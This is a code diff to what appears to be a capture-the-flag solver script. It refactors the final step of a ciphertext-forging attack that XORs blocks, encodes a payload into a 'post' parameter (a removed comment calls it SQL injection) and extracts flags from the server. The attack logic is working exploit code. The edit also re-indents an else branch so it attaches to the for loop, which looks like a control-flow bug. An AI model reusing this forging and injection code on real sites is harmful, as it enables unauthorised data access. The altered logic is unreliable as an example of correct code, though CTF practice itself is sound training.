@@ -204,16 +204,24 @@ try:
         for i in range(len(wanted), 16, -16):
             payload = xor(known[:16], wanted[i-16:i]) + payload
             known = brute_init(payload[:16]) + known
-        
-        # Final Payload and Making a get request for sql injection
-        payload = custom_encode(xor(known[:16], wanted[:16]) + payload)
-        payload = search_flag(r'post=([a-zA-Z0-9\-\_\!\~]+)', get_request(f"{ctf_url}/?post={payload.decode()}").text).group(1)
-        for flag in findall_flags(r"\^FLAG\^(.*?)\$FLAG\$", get_request(f"{ctf_url}/?post={payload}").text):
-            print(flag)
+        # Encode the crafted payload using the custom base64 variant
+        payload_encoded = custom_encode(xor(known[:16], wanted[:16]) + payload)
+        # Send request with the encoded payload
+        response = get_request(f"{ctf_url}/?post={payload_encoded.decode()}").text
+        # Extract the modified 'post' parameter safely
+        match = search_flag(r'post=([a-zA-Z0-9\-\_\!\~]+)', response)
+        if match:
+            payload_final = match.group(1)
+        else:
+            raise ValueError("Could not find modified 'post' parameter in server response. Check payload.")
+        # Fetch all flags from the server response using the final payload
+        response_final = get_request(f"{ctf_url}/?post={payload_final}").text
+        for flag in findall_flags(r"\^FLAG\^(.*?)\$FLAG\$", response_final):
             if flag not in FLAGS:
                 FLAGS.append(f'^FLAG^{flag}$FLAG$')
-    else:
-        print("\033[33m[2] Wrong ctf id check and try again.\033[0m")
+                print(f"\033[32m[*] Found fourth flag: {flag}\033[0m")
+        else:
+            print("\033[33m[2] Wrong ctf id check and try again.\033[0m")
 except Exception as e:
     # Printing Exception #
     print(f"\033[31m[3] {str(e)}\033[0m")
